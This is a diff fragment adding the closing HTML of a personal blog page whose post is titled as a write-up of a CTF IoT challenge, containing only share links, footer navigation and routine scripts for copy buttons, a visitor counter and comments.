+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&is_video=false&description=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第八届西湖论剑初赛IOT-linkon的wp&body=Check out this article: https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&name=第八届西湖论剑初赛IOT-linkon的wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&t=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    pfwqdxwdd
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">catagrioes</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'pfwqdxwdd/pfwqdxwdd.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
